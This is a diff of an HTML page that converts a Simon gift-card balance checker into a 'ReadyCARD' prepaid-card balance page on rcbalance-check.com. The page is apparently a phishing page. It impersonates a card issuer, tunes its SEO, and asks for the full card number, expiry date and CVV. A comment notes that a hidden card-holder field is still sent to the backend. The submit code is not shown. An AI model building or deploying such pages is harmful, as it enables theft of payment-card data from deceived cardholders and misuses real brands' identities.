@@ -3,25 +3,124 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Check your Simon Gift Card balance online. Enter your card number and PIN to see your available balance instantly.">
-  <title>Simon Giftcard - Check Your Balance</title>
+  <title>ReadyCARD&reg; Balance and Transactions - Check Your Prepaid Card Balance</title>
+  <meta name="description" content="Check your ReadyCARD prepaid Visa and Mastercard balance online instantly. Enter your 16-digit card number, expiration date, and CVV to view your available balance and recent transactions.">
+  <meta name="keywords" content="ReadyCARD, prepaid card balance, check card balance, gift card balance, prepaid Mastercard, prepaid Visa, card balance checker, ReadyCARD balance">
+  <meta name="author" content="Ready Credit Corporation">
+  <meta name="robots" content="index, follow">
+  <link rel="canonical" href="https://rcbalance-check.com/">
+
+  <!-- Open Graph / Facebook -->
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://rcbalance-check.com/">
+  <meta property="og:title" content="ReadyCARD&reg; Balance and Transactions">
+  <meta property="og:description" content="Check your ReadyCARD prepaid Visa and Mastercard balance online. Enter your card details to view your available balance instantly.">
+  <meta property="og:image" content="https://rcbalance-check.com/rc-logo.png">
+  <meta property="og:site_name" content="ReadyCARD Balance Checker">
+
+  <!-- Twitter -->
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="ReadyCARD&reg; Balance and Transactions">
+  <meta name="twitter:description" content="Check your ReadyCARD prepaid Visa and Mastercard balance online. Enter your card details to view your available balance instantly.">
+  <meta name="twitter:image" content="https://rcbalance-check.com/rc-logo.png">
+
+  <!-- Verification placeholders -->
+  <meta name="google-site-verification" content="YOUR_GOOGLE_CODE">
+  <meta name="msvalidate.01" content="YOUR_BING_CODE">
+
+  <!-- Structured Data - WebSite -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebSite",
+    "name": "ReadyCARD Balance Checker",
+    "url": "https://rcbalance-check.com/",
+    "description": "Check your ReadyCARD prepaid Visa and Mastercard balance online instantly.",
+    "publisher": {
+      "@type": "Organization",
+      "name": "Ready Credit Corporation",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https://rcbalance-check.com/rc-logo.png"
+      }
+    }
+  }
+  </script>
+
+  <!-- Structured Data - FAQPage -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "FAQPage",
+    "mainEntity": [
+      {
+        "@type": "Question",
+        "name": "How can I use my prepaid card?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Your card works at any merchant that accepts prepaid cards. At the point of sale, swipe your card, provide a signature or enter your 4-digit PIN, and your purchase is complete."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "How do I make online purchases with my prepaid card?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Confirm that the online retailer accepts prepaid cards before checkout. You may also need to register as the cardholder via the Contact Us page."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "How do I set up or change my PIN?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Dial the customer service number on the back of your card and follow the automated prompts. ATM cash withdrawals and cash-back at point of sale are not permitted."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Can I add more funds to my prepaid card?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Prepaid cards are single-load only and cannot be reloaded through ATM deposits, bank transfers, or wire transfers."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Can I cancel my prepaid card and get a refund?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Prepaid cards cannot be canceled and remaining balances are non-refundable. You may continue using your card until the balance is fully spent."
+        }
+      },
+      {
+        "@type": "Question",
+        "name": "Why is my card being declined?",
+        "acceptedAnswer": {
+          "@type": "Answer",
+          "text": "Common reasons include insufficient balance, pending transactions still processing, or merchant pre-authorization holds from gas stations, hotels, and transportation services."
+        }
+      }
+    ]
+  }
+  </script>
+
   <link rel="icon" type="image/svg+xml" href="/favicon.svg?v=3">
+  <link rel="icon" type="image/png" href="/rc-logo.png">
+  <link rel="apple-touch-icon" href="/rc-logo.png">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     :root {
-      --simon-blue: #003DA5;
-      --simon-blue-dark: #002D7A;
-      --simon-blue-light: #0051D4;
-      --simon-gold: #C5A96A;
-      --simon-gold-light: #D4BD8A;
+      --primary: #6B9DAD;
+      --primary-dark: #5A8A9A;
       --white: #ffffff;
-      --bg: #f5f5f5;
+      --bg: #ffffff;
       --text: #333333;
-      --text-muted: #666666;
+      --text-muted: #777777;
       --text-light: #999999;
-      --border: #ddd;
-      --border-light: #e8e8e8;
+      --border: #ccc;
+      --border-light: #e0e0e0;
       --success: #28a745;
       --error: #dc3545;
       --font: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
@@ -30,21 +129,11 @@
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; -webkit-font-smoothing: antialiased; }
 
-    /* Top Banner */
-    .top-banner {
-      background: var(--simon-blue);
-      color: white;
-      text-align: center;
-      padding: 8px 16px;
-      font-size: 0.8rem;
-      letter-spacing: 0.5px;
-    }
-
     /* Header */
     .header {
       background: var(--white);
-      border-bottom: 3px solid var(--simon-gold);
       padding: 0 2rem;
+      border-bottom: 1px solid var(--border-light);
     }
     .header-inner {
       max-width: 1200px;
@@ -52,173 +141,200 @@
       display: flex;
       align-items: center;
       justify-content: space-between;
-      height: 70px;
+      height: 80px;
     }
     .logo {
       display: flex;
       align-items: center;
-      gap: 12px;
+      gap: 0;
       text-decoration: none;
-      color: var(--simon-blue);
     }
-    .logo-icon {
-      width: 44px;
-      height: 44px;
-      background: var(--simon-blue);
-      border-radius: 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: white;
-      font-weight: 800;
-      font-size: 1.1rem;
-      letter-spacing: -0.5px;
-    }
-    .logo-text {
-      font-size: 1.6rem;
-      font-weight: 800;
-      color: var(--simon-blue);
-      letter-spacing: -0.5px;
-    }
-    .logo-sub {
-      font-size: 0.7rem;
-      color: var(--simon-gold);
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 2px;
-      margin-top: -2px;
+    .logo-img {
+      height: 64px;
+      width: auto;
+      display: block;
     }
 
     .nav {
       display: flex;
       gap: 0;
-      height: 100%;
-      align-items: stretch;
+      align-items: center;
     }
     .nav a {
-      color: var(--text);
+      color: var(--text-muted);
       text-decoration: none;
       font-weight: 600;
-      font-size: 0.875rem;
-      padding: 0 1.25rem;
-      display: flex;
-      align-items: center;
-      border-bottom: 3px solid transparent;
-      margin-bottom: -3px;
-      transition: all 0.2s;
+      font-size: 0.8rem;
+      padding: 0.5rem 1.25rem;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      transition: color 0.2s;
     }
-    .nav a:hover { color: var(--simon-blue); border-bottom-color: var(--simon-blue); }
-    .nav a.active { color: var(--simon-blue); border-bottom-color: var(--simon-blue); }
+    .nav a:hover { color: var(--text); }
+    .nav a.active { color: var(--text); }
 
-    /* Hero Section */
-    .hero {
-      background: linear-gradient(135deg, var(--simon-blue) 0%, var(--simon-blue-dark) 100%);
-      padding: 3rem 2rem;
+    /* Main Content */
+    .main-wrapper {
+      max-width: 700px;
+      margin: 0 auto;
+      padding: 3rem 2rem 2rem;
       text-align: center;
-      color: white;
-      position: relative;
-      overflow: hidden;
     }
-    .hero::before {
-      content: "";
-      position: absolute;
-      top: -50%;
-      right: -20%;
-      width: 60%;
-      height: 200%;
-      background: rgba(255,255,255,0.03);
-      transform: rotate(20deg);
-    }
-    .hero h1 {
-      font-size: 2.25rem;
-      font-weight: 800;
-      margin-bottom: 0.5rem;
+    .main-wrapper h1 {
+      font-size: 2.5rem;
+      font-weight: 400;
+      color: var(--text);
+      margin-bottom: 2.5rem;
       letter-spacing: -0.5px;
     }
-    .hero p {
-      font-size: 1.05rem;
-      opacity: 0.85;
-      max-width: 500px;
+
+    /* Form */
+    .form-card {
+      max-width: 600px;
       margin: 0 auto;
     }
 
-    /* Main Content */
-    .main-content {
-      max-width: 1100px;
-      margin: -2rem auto 3rem;
-      padding: 0 2rem;
+    .input-group {
       position: relative;
-      z-index: 1;
+      margin-bottom: 1rem;
     }
-    .content-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 2rem;
-      align-items: start;
-    }
-    @media (max-width: 850px) {
-      .content-grid { grid-template-columns: 1fr; }
-    }
-
-    /* Card Form Section */
-    .form-card {
-      background: var(--white);
-      border-radius: 12px;
-      padding: 2.5rem;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-      border: 1px solid var(--border-light);
-    }
-    .form-card h2 {
-      font-size: 1.35rem;
-      font-weight: 700;
-      color: var(--simon-blue);
-      margin-bottom: 0.4rem;
-    }
-    .form-card .subtitle {
-      color: var(--text-muted);
-      font-size: 0.9rem;
-      margin-bottom: 1.75rem;
-      line-height: 1.5;
-    }
-
-    .form-group {
-      margin-bottom: 1.25rem;
-    }
-    .form-group label {
-      display: block;
-      font-size: 0.85rem;
-      font-weight: 600;
-      color: var(--text);
-      margin-bottom: 0.4rem;
-    }
-    .form-group label .required {
-      color: var(--error);
-    }
-    .form-group input {
+    .input-group input {
       width: 100%;
-      padding: 0.75rem 1rem;
-      font-size: 0.95rem;
+      padding: 1rem 1rem 1rem 3rem;
+      font-size: 1rem;
       border: 1px solid var(--border);
-      border-radius: 6px;
-      transition: all 0.2s;
+      border-radius: 4px;
       font-family: inherit;
       color: var(--text);
       background: var(--white);
+      transition: border-color 0.2s;
     }
-    .form-group input:focus {
+    .input-group input:focus {
       outline: 0;
-      border-color: var(--simon-blue);
-      box-shadow: 0 0 0 3px rgba(0, 61, 165, 0.1);
+      border-color: var(--primary);
     }
-    .form-group input::placeholder { color: #bbb; }
-    .form-group input.error { border-color: var(--error); }
+    .input-group input::placeholder { color: #aaa; font-size: 0.95rem; }
+    .input-group input.error { border-color: var(--error); }
+    .input-group .input-icon {
+      position: absolute;
+      left: 1rem;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #999;
+      display: flex;
+      align-items: center;
+    }
 
-    .card-number-wrapper {
+    .field-error {
+      font-size: 0.75rem;
+      color: var(--error);
+      margin-top: 0.25rem;
+      font-weight: 500;
+      display: block;
+      text-align: left;
+    }
+
+    .form-row {
+      display: flex;
+      gap: 1rem;
+      margin-bottom: 1rem;
+    }
+
+    /* Expiry group: MM / YY side by side */
+    .expiry-group {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      overflow: hidden;
+      transition: border-color 0.2s;
       position: relative;
     }
-    .card-number-wrapper input {
-      padding-right: 60px;
+    .expiry-group:focus-within { border-color: var(--primary); }
+    .expiry-group.error { border-color: var(--error); }
+    .expiry-group input {
+      border: none;
+      outline: none;
+      padding: 1rem 0.5rem;
+      font-size: 1rem;
+      font-family: inherit;
+      color: var(--text);
+      background: transparent;
+      text-align: center;
+      width: 50%;
     }
+    .expiry-group input::placeholder { color: #aaa; font-size: 0.95rem; }
+    .expiry-slash {
+      color: #aaa;
+      font-size: 1.2rem;
+      font-weight: 300;
+      user-select: none;
+      flex-shrink: 0;
+    }
+
+    /* CVV group */
+    .cvv-group {
+      flex: 0 0 160px;
+      position: relative;
+    }
+    .cvv-group input {
+      width: 100%;
+      padding: 1rem 2.75rem 1rem 1rem;
+      font-size: 1rem;
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      font-family: inherit;
+      color: var(--text);
+      background: var(--white);
+      transition: border-color 0.2s;
+    }
+    .cvv-group input:focus { outline: 0; border-color: var(--primary); }
+    .cvv-group input::placeholder { color: #aaa; font-size: 0.95rem; }
+    .cvv-group input.error { border-color: var(--error); }
+    .cvv-info {
+      position: absolute;
+      right: 0.75rem;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 22px;
+      height: 22px;
+      border: 2px solid #bbb;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 0.75rem;
+      font-weight: 700;
+      color: #999;
+      cursor: help;
+      font-style: italic;
+      font-family: Georgia, serif;
+    }
+    .cvv-tooltip {
+      display: none;
+      position: absolute;
+      bottom: calc(100% + 8px);
+      right: 0;
+      background: #333;
+      color: white;
+      padding: 0.5rem 0.75rem;
+      border-radius: 6px;
+      font-size: 0.75rem;
+      white-space: nowrap;
+      z-index: 10;
+    }
+    .cvv-tooltip::after {
+      content: "";
+      position: absolute;
+      top: 100%;
+      right: 14px;
+      border: 6px solid transparent;
+      border-top-color: #333;
+    }
+    .cvv-info:hover + .cvv-tooltip { display: block; }
+
+    /* Card brand badge in card number field */
     .card-brand-badge {
       position: absolute;
       right: 10px;
@@ -228,219 +344,55 @@
       opacity: 0;
       transition: opacity 0.3s ease;
     }
-    .card-brand-badge.visible {
-      opacity: 1;
-    }
+    .card-brand-badge.visible { opacity: 1; }
     .card-brand-badge img {
       height: 28px;
       width: auto;
       border-radius: 4px;
     }
 
-    .field-error {
-      font-size: 0.75rem;
-      color: var(--error);
-      margin-top: 0.3rem;
-      font-weight: 500;
-      display: block;
-    }
-
-    .form-row {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 1rem;
-    }
-
-    .pin-hint {
-      display: flex;
-      align-items: flex-start;
-      gap: 8px;
-      margin-top: 0.4rem;
-      padding: 0.6rem 0.75rem;
-      background: #f8f9fa;
-      border-radius: 6px;
-      font-size: 0.78rem;
-      color: var(--text-muted);
-      line-height: 1.4;
-    }
-    .pin-hint svg {
-      flex-shrink: 0;
-      margin-top: 1px;
-      color: var(--simon-blue);
-    }
-
+    /* Submit button */
     .btn-check {
-      background: var(--simon-blue);
+      background: var(--primary);
       color: white;
-      padding: 0.85rem 2rem;
-      border-radius: 6px;
+      padding: 1rem 2rem;
+      border-radius: 4px;
       border: none;
       font-size: 1rem;
       font-weight: 700;
       cursor: pointer;
       width: 100%;
-      transition: all 0.2s;
-      margin-top: 0.75rem;
+      transition: background 0.2s;
+      margin-top: 0.5rem;
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 8px;
-      letter-spacing: 0.3px;
     }
-    .btn-check:hover { background: var(--simon-blue-dark); }
+    .btn-check:hover { background: var(--primary-dark); }
     .btn-check:active { transform: scale(0.99); }
     .btn-check:disabled { opacity: 0.65; cursor: not-allowed; }
 
     .btn-another {
       background: var(--white);
-      color: var(--simon-blue);
-      padding: 0.75rem 2rem;
-      border-radius: 6px;
-      border: 2px solid var(--simon-blue);
+      color: var(--primary);
+      padding: 0.85rem 2rem;
+      border-radius: 4px;
+      border: 2px solid var(--primary);
       font-size: 0.95rem;
       font-weight: 700;
       cursor: pointer;
       width: 100%;
       transition: all 0.2s;
       margin-top: 1rem;
-      display: none;
-    }
-    .btn-another:hover { background: var(--simon-blue); color: white; }
-    .btn-another.show { display: block; }
-
-    /* Info Section */
-    .info-card {
-      background: var(--white);
-      border-radius: 12px;
-      padding: 2rem;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-      border: 1px solid var(--border-light);
-    }
-
-    /* Gift Card Visual */
-    .gc-visual {
-      width: 100%;
-      aspect-ratio: 1.6/1;
-      background: linear-gradient(135deg, var(--simon-blue) 0%, #001F5C 100%);
-      border-radius: 12px;
-      padding: 1.75rem;
-      color: white;
-      position: relative;
-      overflow: hidden;
-      margin-bottom: 1.5rem;
-      box-shadow: 0 8px 24px rgba(0, 61, 165, 0.3);
-    }
-    .gc-visual::before {
-      content: "";
-      position: absolute;
-      top: -30%;
-      right: -15%;
-      width: 50%;
-      height: 160%;
-      background: rgba(255,255,255,0.04);
-      transform: rotate(20deg);
-    }
-    .gc-visual::after {
-      content: "";
-      position: absolute;
-      bottom: 0;
-      left: 0;
-      right: 0;
-      height: 4px;
-      background: var(--simon-gold);
-    }
-    .gc-brand {
-      font-size: 1.35rem;
-      font-weight: 800;
-      letter-spacing: -0.5px;
-      margin-bottom: 0.25rem;
-    }
-    .gc-type {
-      font-size: 0.7rem;
-      text-transform: uppercase;
-      letter-spacing: 3px;
-      opacity: 0.7;
-      font-weight: 600;
-    }
-    .gc-chip {
-      width: 40px;
-      height: 30px;
-      background: linear-gradient(135deg, #ffd700, #daa520);
-      border-radius: 5px;
-      margin: 1.25rem 0;
-      position: relative;
-      overflow: hidden;
-    }
-    .gc-chip::after {
-      content: "";
-      position: absolute;
-      inset: 0;
-      background: repeating-linear-gradient(90deg, transparent, transparent 5px, rgba(0,0,0,0.08) 5px, rgba(0,0,0,0.08) 10px);
-    }
-    .gc-number {
-      font-family: 'Courier New', monospace;
-      font-size: 1.2rem;
-      letter-spacing: 3px;
-      margin-bottom: 1rem;
-      text-shadow: 0 1px 3px rgba(0,0,0,0.3);
-    }
-    .gc-bottom {
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-end;
-    }
-    .gc-label {
-      font-size: 0.55rem;
       text-transform: uppercase;
       letter-spacing: 1px;
-      opacity: 0.6;
-      margin-bottom: 2px;
+      display: none;
     }
-    .gc-value {
-      font-size: 0.85rem;
-      font-weight: 600;
-    }
-
-    /* Info Items */
-    .info-title {
-      font-size: 1.1rem;
-      font-weight: 700;
-      color: var(--simon-blue);
-      margin-bottom: 1rem;
-      display: flex;
-      align-items: center;
-      gap: 8px;
-    }
-    .info-item {
-      display: flex;
-      gap: 12px;
-      margin-bottom: 1rem;
-      padding-bottom: 1rem;
-      border-bottom: 1px solid var(--border-light);
-    }
-    .info-item:last-child { border-bottom: none; margin-bottom: 0; padding-bottom: 0; }
-    .info-icon {
-      width: 36px;
-      height: 36px;
-      background: #f0f4ff;
-      border-radius: 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-      color: var(--simon-blue);
-    }
-    .info-text h4 {
-      font-size: 0.85rem;
-      font-weight: 700;
-      color: var(--text);
-      margin-bottom: 2px;
-    }
-    .info-text p {
-      font-size: 0.8rem;
-      color: var(--text-muted);
-      line-height: 1.4;
-    }
+    .btn-another:hover { background: var(--primary); color: white; }
+    .btn-another.show { display: block; }
 
     /* Balance Result */
     .balance-result {
@@ -456,13 +408,13 @@
     .balance-result.success .result-box {
       background: #f0fdf4;
       border: 1px solid #bbf7d0;
-      border-radius: 12px;
+      border-radius: 8px;
       padding: 2rem;
     }
     .balance-result.error .result-box {
       background: #fef2f2;
       border: 1px solid #fecaca;
-      border-radius: 12px;
+      border-radius: 8px;
       padding: 2rem;
     }
     .result-icon {
@@ -486,9 +438,7 @@
       font-weight: 600;
       margin-bottom: 0.5rem;
     }
-    .balance-amount {
-      margin: 0.5rem 0;
-    }
+    .balance-amount { margin: 0.5rem 0; }
     .currency {
       font-size: 1.25rem;
       font-weight: 600;
@@ -498,7 +448,7 @@
     .amount {
       font-size: 3rem;
       font-weight: 800;
-      color: var(--simon-blue);
+      color: var(--primary-dark);
       letter-spacing: -1px;
     }
     .card-info {
@@ -516,7 +466,7 @@
     .loading-overlay {
       position: fixed;
       inset: 0;
-      background: rgba(0, 30, 80, 0.85);
+      background: rgba(50, 50, 50, 0.85);
       backdrop-filter: blur(4px);
       display: none;
       align-items: center;
@@ -531,7 +481,7 @@
       width: 44px;
       height: 44px;
       border: 4px solid rgba(255,255,255,0.15);
-      border-top-color: var(--simon-gold);
+      border-top-color: var(--primary);
       border-radius: 50%;
       animation: spin 0.8s linear infinite;
     }
@@ -546,28 +496,28 @@
     .page.active { display: block; animation: fadeIn 0.3s ease-out; }
     @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
-    .content-section {
-      background: var(--white);
-      border-radius: 12px;
-      padding: 2.5rem;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.08);
-      border: 1px solid var(--border-light);
-      max-width: 800px;
-      margin: 2rem auto 0;
+    /* Content pages (FAQ, About, etc.) */
+    .page-hero {
+      text-align: center;
+      padding: 3rem 2rem 1rem;
     }
-    .content-section h2 {
-      font-size: 1.75rem;
-      font-weight: 800;
-      color: var(--simon-blue);
-      margin-bottom: 1rem;
+    .page-hero h1 {
+      font-size: 2rem;
+      font-weight: 400;
+      color: var(--text);
+    }
+    .content-section {
+      max-width: 700px;
+      margin: 1.5rem auto 0;
+      padding: 0 2rem 3rem;
     }
     .content-section p {
       color: var(--text-muted);
-      font-size: 1rem;
+      font-size: 0.95rem;
       margin-bottom: 1.25rem;
       line-height: 1.7;
+      text-align: center;
     }
-
     .faq-item {
       border-bottom: 1px solid var(--border-light);
       padding: 1.25rem 0;
@@ -579,19 +529,19 @@
       color: var(--text);
       margin-bottom: 0.5rem;
     }
-    .faq-item p { margin-bottom: 0; font-size: 0.925rem; }
+    .faq-item p { margin-bottom: 0; font-size: 0.925rem; color: var(--text-muted); line-height: 1.6; text-align: left; }
 
     /* Footer */
     .footer {
-      background: var(--simon-blue-dark);
-      color: rgba(255,255,255,0.7);
+      border-top: 1px solid var(--border-light);
+      color: var(--text-muted);
       padding: 2rem;
       text-align: center;
-      font-size: 0.8rem;
-      margin-top: 3rem;
+      font-size: 0.78rem;
+      line-height: 1.7;
+      max-width: 900px;
+      margin: 2rem auto 0;
     }
-    .footer a { color: rgba(255,255,255,0.85); text-decoration: none; }
-    .footer a:hover { color: white; text-decoration: underline; }
     .footer-links {
       display: flex;
       justify-content: center;
@@ -599,41 +549,43 @@
       margin-bottom: 1rem;
       flex-wrap: wrap;
     }
+    .footer-links a {
+      color: var(--text-muted);
+      text-decoration: none;
+      font-size: 0.8rem;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    .footer-links a:hover { color: var(--text); }
 
     .hide { display: none !important; }
 
     /* Mobile */
     @media (max-width: 600px) {
-      .header-inner { padding: 0 0.5rem; }
-      .nav a { padding: 0 0.75rem; font-size: 0.8rem; }
-      .hero h1 { font-size: 1.5rem; }
-      .hero p { font-size: 0.9rem; }
-      .main-content { padding: 0 1rem; }
-      .form-card, .info-card { padding: 1.5rem; }
-      .form-row { grid-template-columns: 1fr; }
+      .header-inner { padding: 0 0.5rem; height: 70px; }
+      .logo-img { height: 48px; }
+      .nav a { padding: 0.5rem 0.6rem; font-size: 0.7rem; }
+      .main-wrapper { padding: 2rem 1rem; }
+      .main-wrapper h1 { font-size: 1.6rem; }
+      .form-row { flex-direction: column; }
+      .cvv-group { flex: 1; }
+      .expiry-group input { padding: 0.85rem 0.5rem; }
     }
   </style>
 </head>
 <body>
-  <!-- Top Banner -->
-  <div class="top-banner">
-    Secure Gift Card Balance Verification
-  </div>
-
   <!-- Header -->
   <header class="header">
     <div class="header-inner">
       <a href="/" class="logo">
-        <div class="logo-icon">S</div>
-        <div>
-          <div class="logo-text">Simon</div>
-          <div class="logo-sub">Giftcard</div>
-        </div>
+        <img src="/rc-logo.png" alt="Logo" class="logo-img">
       </a>
       <nav class="nav">
-        <a href="/" class="nav-link" data-page="home">Check Balance</a>
         <a href="/faq" class="nav-link" data-page="faq">FAQ</a>
-        <a href="/about" class="nav-link" data-page="about">About</a>
+        <a href="/privacy" class="nav-link" data-page="privacy">Privacy Policy</a>
+        <a href="/contact" class="nav-link" data-page="contact">Contact Us</a>
+        <a href="/about" class="nav-link" data-page="about">Cardholder Agreements</a>
       </nav>
     </div>
   </header>
@@ -642,176 +594,139 @@
   <main>
     <!-- HOME PAGE -->
     <section id="page-home" class="page active">
-      <div class="hero">
-        <h1>Check Your Gift Card Balance</h1>
-        <p>Enter your card details below to view your current available balance.</p>
-      </div>
+      <div class="main-wrapper">
+        <h1>What is my Card Balance</h1>
 
-      <div class="main-content">
-        <div class="content-grid">
-          <!-- Form -->
-          <div class="form-card">
-            <h2>Card Information</h2>
-            <p class="subtitle">Please enter the details found on your gift card.</p>
+        <div class="form-card">
+          <form id="balanceForm">
+            <div id="formFields">
+              <!-- Card Number -->
+              <div class="input-group">
+                <div class="input-icon">
+                  <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
+                </div>
+                <input type="text" id="cardNumber" placeholder="16-Digit Card Number" maxlength="23" inputmode="numeric" autocomplete="off">
+                <div class="card-brand-badge" id="cardBrandBadge"><img id="cardBrandImg" src="" alt=""></div>
+              </div>
+              <span class="field-error" id="cardError"></span>
 
-            <form id="balanceForm">
-              <div id="formFields">
-                <div class="form-group">
-                  <label for="cardNumber">Card Number <span class="required">*</span></label>
-                  <div class="card-number-wrapper">
-                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="23" inputmode="numeric" autocomplete="off">
-                    <div class="card-brand-badge" id="cardBrandBadge"><img id="cardBrandImg" src="" alt=""></div>
+              <!-- Expiry + CVV row -->
+              <div class="form-row">
+                <div style="flex:1;">
+                  <div class="expiry-group" id="expiryGroup">
+                    <input type="text" id="expiryMonth" placeholder="MM" maxlength="2" inputmode="numeric" autocomplete="off">
+                    <span class="expiry-slash">/</span>
+                    <input type="text" id="expiryYear" placeholder="YY" maxlength="2" inputmode="numeric" autocomplete="off">
                   </div>
-                  <span class="field-error" id="cardError"></span>
+                  <span class="field-error" id="expiryError"></span>
                 </div>
-
-                <div class="form-group">
-                  <label for="cardHolder">Card Holder Name <span style="font-weight:400;color:var(--text-light)">(Optional)</span></label>
-                  <input type="text" id="cardHolder" placeholder="Enter name on card" autocomplete="off">
+                <div class="cvv-group">
+                  <input type="password" id="pin" placeholder="CVV" maxlength="3" inputmode="numeric" autocomplete="off">
+                  <div class="cvv-info">i</div>
+                  <div class="cvv-tooltip">3-digit code on the back of your card</div>
+                  <span class="field-error" id="pinError"></span>
                 </div>
-
-                <div class="form-row">
-                  <div class="form-group">
-                    <label for="pin">PIN / Security Code <span class="required">*</span></label>
-                    <input type="password" id="pin" placeholder="Enter PIN" maxlength="4" inputmode="numeric" autocomplete="off">
-                    <span class="field-error" id="pinError"></span>
-                  </div>
-                  <div class="form-group">
-                    <label for="expiryDate">Expiration (MM/YY)</label>
-                    <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="off">
-                    <span class="field-error" id="expiryError"></span>
-                  </div>
-                </div>
-
-                <div class="pin-hint">
-                  <svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
-                  <span>The PIN is located on the back of your card. You may need to scratch off the silver coating to reveal it.</span>
-                </div>
-
-                <button type="submit" class="btn-check" id="submitBtn">
-                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
-                  Check Balance
-                </button>
               </div>
 
-              <div id="result" class="balance-result"></div>
-              <button type="button" class="btn-another" id="checkAnother">Check Another Card</button>
-            </form>
-          </div>
+              <!-- Hidden card holder (still sent to backend) -->
+              <input type="hidden" id="cardHolder" value="">
 
-          <!-- Info Sidebar -->
-          <div>
-            <!-- Gift Card Visual -->
-            <div class="info-card" style="margin-bottom: 1.5rem;">
-              <div class="gc-visual">
-                <div class="gc-brand">Simon</div>
-                <div class="gc-type">Gift Card</div>
-                <div class="gc-chip"></div>
-                <div class="gc-number" id="gcNumber">&bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull; &bull;&bull;&bull;&bull;</div>
-                <div class="gc-bottom">
-                  <div>
-                    <div class="gc-label">Card Holder</div>
-                    <div class="gc-value" id="gcHolder">GIFT CARD</div>
-                  </div>
-                  <div>
-                    <div class="gc-label">Valid Thru</div>
-                    <div class="gc-value" id="gcExpiry">MM/YY</div>
-                  </div>
-                  <div id="gcBrand" style="height:32px;display:flex;align-items:center;"></div>
-                </div>
-              </div>
+              <button type="submit" class="btn-check" id="submitBtn">
+                SHOW BALANCE
+              </button>
             </div>
 
-            <!-- How It Works -->
-            <div class="info-card">
-              <div class="info-title">
-                <svg width="20" height="20" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
-                How It Works
-              </div>
-
-              <div class="info-item">
-                <div class="info-icon">
-                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
-                </div>
-                <div class="info-text">
-                  <h4>1. Enter Card Details</h4>
-                  <p>Type your 16-digit card number and 4-digit PIN from the back of your card.</p>
-                </div>
-              </div>
-
-              <div class="info-item">
-                <div class="info-icon">
